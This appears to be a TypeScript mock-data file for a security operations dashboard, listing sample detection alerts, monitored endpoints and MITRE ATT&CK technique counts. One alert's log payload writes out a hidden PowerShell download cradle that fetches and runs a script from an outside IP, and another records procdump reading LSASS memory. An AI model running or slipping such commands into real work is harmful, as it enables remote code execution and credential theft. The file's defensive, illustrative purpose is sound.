import { SocAlert, SocEndpoint } from '../types';

export const SOC_ALERTS: SocAlert[] = [
  {
    id: 'ALT-9042',
    timestamp: '2026-09-15 22:10:41',
    severity: 'CRITICAL',
    ruleName: 'Mimikatz LSASS Memory Dump Attempt Detected',
    sourceIp: '10.0.4.88',
    destinationIp: '10.0.1.5 (DC-PROD-01)',
    endpoint: 'FIN-WKS-042',
    mitreTechnique: 'T1003.001 - OS Credential Dumping',
    status: 'INVESTIGATING',
    logPayload: `{"timestamp":"2026-09-15T22:10:41Z","agent":{"id":"004","name":"FIN-WKS-042","ip":"10.0.4.88"},"rule":{"id":"100084","level":14,"description":"Access to LSASS process memory with PROCESS_VM_READ permissions"},"data":{"win":{"system":{"eventID":"10","channel":"Microsoft-Windows-Sysmon/Operational"},"eventdata":{"SourceImage":"C:\\\\Users\\\\guest_temp\\\\procdump.exe","TargetImage":"C:\\\\Windows\\\\System32\\\\lsass.exe","GrantedAccess":"0x1010"}}}`
  },
  {
    id: 'ALT-9041',
    timestamp: '2026-09-15 22:04:19',
    severity: 'HIGH',
    ruleName: 'SSH High-Frequency Authentication Failure Spike (Brute Force)',
    sourceIp: '198.51.100.44',
    destinationIp: '10.0.1.20 (BASTION-01)',
    endpoint: 'BASTION-01',
    mitreTechnique: 'T1110.001 - Password Guessing',
    status: 'CONTAINED',
    logPayload: `{"timestamp":"2026-09-15T22:04:19Z","agent":{"id":"001","name":"BASTION-01","ip":"10.0.1.20"},"rule":{"id":"5710","level":10,"description":"Multiple SSH failed logins (threshold 20 attempts/min exceeded)"},"data":{"srcip":"198.51.100.44","dstuser":"root","action":"firewall-drop-initiated"}}`
  },
  {
    id: 'ALT-9040',
    timestamp: '2026-09-15 21:48:02',
    severity: 'HIGH',
    ruleName: 'Web Shell Activity: Unusual File Created in Webroot',
    sourceIp: '203.0.113.12',
    destinationIp: '10.0.2.10 (WEB-PROD-01)',
    endpoint: 'WEB-PROD-01',
    mitreTechnique: 'T1505.003 - Server Software Component: Web Shell',
    status: 'ESCALATED',
    logPayload: `{"timestamp":"2026-09-15T21:48:02Z","agent":{"id":"002","name":"WEB-PROD-01","ip":"10.0.2.10"},"rule":{"id":"554","level":12,"description":"File added to monitored webroot: /var/www/html/uploads/cache_b.php"},"syscheck":{"path":"/var/www/html/uploads/cache_b.php","md5_after":"d41d8cd98f00b204e9800998ecf8427e","uname_after":"www-data"}}`
  },
  {
    id: 'ALT-9039',
    timestamp: '2026-09-15 21:15:33',
    severity: 'MEDIUM',
    ruleName: 'Suspicious PowerShell Download Cradle Invoked',
    sourceIp: '10.0.4.15',
    destinationIp: '185.220.101.5',
    endpoint: 'DEV-LAPTOP-09',
    mitreTechnique: 'T1059.001 - Command and Scripting Interpreter: PowerShell',
    status: 'RESOLVED',
    logPayload: `{"timestamp":"2026-09-15T21:15:33Z","agent":{"id":"006","name":"DEV-LAPTOP-09","ip":"10.0.4.15"},"rule":{"id":"100051","level":8,"description":"PowerShell executing Net.WebClient downloadstring"},"data":{"commandline":"powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://185.220.101.5/stage.ps1')"}}`
  },
  {
    id: 'ALT-9038',
    timestamp: '2026-09-15 20:50:11',
    severity: 'LOW',
    ruleName: 'Unusual Outbound DNS Query with High Subdomain Entropy',
    sourceIp: '10.0.3.18',
    destinationIp: '8.8.8.8',
    endpoint: 'CORP-SRV-03',
    mitreTechnique: 'T1071.004 - Application Layer Protocol: DNS',
    status: 'RESOLVED',
    logPayload: `{"timestamp":"2026-09-15T20:50:11Z","agent":{"id":"003","name":"CORP-SRV-03","ip":"10.0.3.18"},"rule":{"id":"100092","level":6,"description":"DNS query string length > 64 chars indicating potential DNS tunneling"},"data":{"query":"a89fbc002341b8f0923a.tunnel.cdn-telemetry.org"}}`
  }
];

export const SOC_ENDPOINTS: SocEndpoint[] = [
  { id: 'ep-1', hostname: 'DC-PROD-01', ip: '10.0.1.5', os: 'Windows Server 2022', wazuhStatus: 'Active', lastKeepAlive: '4s ago', agentId: '001' },
  { id: 'ep-2', hostname: 'WEB-PROD-01', ip: '10.0.2.10', os: 'Ubuntu 24.04 LTS', wazuhStatus: 'Active', lastKeepAlive: '2s ago', agentId: '002' },
  { id: 'ep-3', hostname: 'CORP-SRV-03', ip: '10.0.3.18', os: 'Red Hat Enterprise Linux 9', wazuhStatus: 'Active', lastKeepAlive: '12s ago', agentId: '003' },
  { id: 'ep-4', hostname: 'FIN-WKS-042', ip: '10.0.4.88', os: 'Windows 11 Enterprise', wazuhStatus: 'Active', lastKeepAlive: '1s ago', agentId: '004' },
  { id: 'ep-5', hostname: 'DEV-LAPTOP-09', ip: '10.0.4.15', os: 'Windows 11 Pro', wazuhStatus: 'Active', lastKeepAlive: '8s ago', agentId: '005' },
  { id: 'ep-6', hostname: 'BACKUP-NAS-01', ip: '10.0.1.99', os: 'TrueNAS Core', wazuhStatus: 'Pending', lastKeepAlive: '2m ago', agentId: '006' }
];

export const MITRE_MAPPINGS = [
  { technique: 'T1003.001', name: 'OS Credential Dumping: LSASS', count: 4, tactics: ['Credential Access'] },
  { technique: 'T1110.001', name: 'Brute Force: Password Guessing', count: 18, tactics: ['Credential Access'] },
  { technique: 'T1505.003', name: 'Server Component: Web Shell', count: 2, tactics: ['Persistence', 'Persistence'] },
  { technique: 'T1059.001', name: 'Command & Script: PowerShell', count: 7, tactics: ['Execution'] },
  { technique: 'T1071.004', name: 'Application Protocol: DNS Tunneling', count: 3, tactics: ['Command & Control', 'Exfiltration'] },
  { technique: 'T1548.003', name: 'Abuse Elevation: Sudo and Sudo Caching', count: 5, tactics: ['Privilege Escalation'] }
];
